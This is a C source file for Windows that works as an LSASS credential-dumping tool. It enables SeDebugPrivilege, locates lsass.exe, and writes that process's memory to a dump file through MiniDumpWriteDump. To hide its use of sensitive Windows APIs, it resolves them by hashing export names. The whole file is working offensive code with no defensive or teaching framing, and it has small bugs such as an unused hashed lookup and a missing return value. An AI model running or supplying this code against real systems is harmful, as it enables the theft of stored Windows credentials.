#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string.h>
#include "main.h"

int FindTarget(const char* procname) {
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;

        // Take a snapshot of all the processes currently running
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (INVALID_HANDLE_VALUE == hProcSnap)
                return 0;

        // PROCESSENTRY32 is a struct that holds process info
        // setting dwSize ensure the code works correctly on 32-bit and 64-bit envs
        pe32.dwSize = sizeof(PROCESSENTRY32);

        // Check if any processes are currently running
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }

        while (Process32Next(hProcSnap, &pe32)) {
                // lstrcmpiA ignore the capitalization of the process letters
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }

        CloseHandle(hProcSnap);

        return pid;
}

DWORD getHashFromString(char* string) {
        size_t stringLength = strnlen_s(string, 50);
        DWORD hash = 0x45;

        for (size_t i = 0; i < stringLength; i++) {
                hash += (hash * 0xab10f29f + string[i]) & 0xffffff;
        }

        return hash;
}

PDWORD getFunctionAddressByHash(char* library, DWORD hash) {
        PDWORD functionAddress = (PDWORD)0;

        // Get base address of the module in which our exported function of interest resides
        HMODULE libraryBase = LoadLibraryA(library);

        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
        PIMAGE_NT_HEADERS imageNTHeaders =
            (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);

        DWORD_PTR exportDirectoryRVA =
            imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                .VirtualAddress;

        PIMAGE_EXPORT_DIRECTORY imageExportDirectory =
            (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);

        // Get RVAs to exported function related information
        PDWORD addresOfFunctionsRVA =
            (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
        PDWORD addressOfNamesRVA =
            (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
        PWORD addressOfNameOrdinalsRVA =
            (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

        // Iterate through exported functions, calculate their hashes and check if any of them match
        for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++) {
                DWORD functionNameRVA = addressOfNamesRVA[i];
                DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
                char* functionName = (char*)functionNameVA;
                DWORD_PTR functionAddressRVA = 0;

                // Calculate hash for this exported function
                DWORD functionNameHash = getHashFromString(functionName);

                if (functionNameHash == hash) {
                        functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
                        functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
                        printf("%s : 0x%x : %p\n", functionName, functionNameHash, functionAddress);
                        return functionAddress;
                }
        }
}

BOOL setPrivilege(LPCTSTR privilegeName) {
        PDWORD pOP = getFunctionAddressByHash((char*)"advapi32.dll", 0x009f6858e);
        OpenProcessToken_t pOpenProcessT = (OpenProcessToken_t)pOP;

        HANDLE hToken = NULL;
        if (!pOpenProcessT(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
                printf("OpenProcessToken failed");
                return FALSE;
        }
        PDWORD pLP = getFunctionAddressByHash((char*)"advapi32.dll", 0x00e3fed61);
        LookupPrivilegeValueA_t pLookupPriv = (LookupPrivilegeValueA_t)pLP;

        LUID luid;
        if (!pLookupPriv(NULL, privilegeName, &luid)) {
                printf("LookupPrivilegeValue failed");
                CloseHandle(hToken);
                return FALSE;
        }

        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        PDWORD pATP = getFunctionAddressByHash((char*)"advapi32.dll", 0x00c49f593);
        AdjustTokenPrivileges_t pAdjustT = (AdjustTokenPrivileges_t)pATP;

        SetLastError(0);
        if (!pAdjustT(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
                printf("AdjustTokenPrivileges failed");
                CloseHandle(hToken);
                return FALSE;
        }
        DWORD e = GetLastError();
        if (e == ERROR_NOT_ALL_ASSIGNED) {
                printf("failed");
                CloseHandle(hToken);
                return FALSE;
        }

        CloseHandle(hToken);
        return TRUE;
}
int main() {
        if (!setPrivilege(SE_DEBUG_NAME)) {
                printf("[-] Cannot enable SeDebugPrivilege\n");
                return 1;
        }
        printf("[+] SeDebugPrivilege enabled !!\n");

        const char* procname = "lsass.exe";

        int pid = FindTarget(procname);

        DWORD hOpenProcess = getHashFromString("IsWow64Process");
        PDWORD pOP = getFunctionAddressByHash((char*)"kernel32.dll", hOpenProcess);
        OpenProcess_t pOpenP = (OpenProcess_t)pOP;

        // HANDLE hProc = pOpenP(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, 0, pid);
        HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, 0, pid);
        if (hProc == INVALID_HANDLE_VALUE) {
                printf("[-] OpenProcess failed: %lu\n", GetLastError());
        }

        printf("  PID: %u\n", pid);

        HANDLE hFile = CreateFileA("slmskzkozd,.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                                   FILE_ATTRIBUTE_NORMAL, NULL);

        if (hFile == INVALID_HANDLE_VALUE) {
                printf("[-] CreateFile failed: %lu\n", GetLastError());
                CloseHandle(hProc);
        }
        PDWORD pMDWD = getFunctionAddressByHash((char*)"dbgcore.dll", 0x00a838290);
        MiniDumpWriteDump_t pMiniDump = (MiniDumpWriteDump_t)pMDWD;

        printf("  Trying to dump the process memory...\n");
        BOOL dump =
            pMiniDump((HANDLE)hProc, (DWORD)pid, (HANDLE)hFile, 0x00000002, NULL, NULL, NULL);

        if (!dump) {
                printf("[-] The dump failed: %lu\n", GetLastError());
        } else {
                printf("[+] The dump succeeded !!!!\n");
        }

        CloseHandle(hFile);
        CloseHandle(hProc);
        return 0;
}
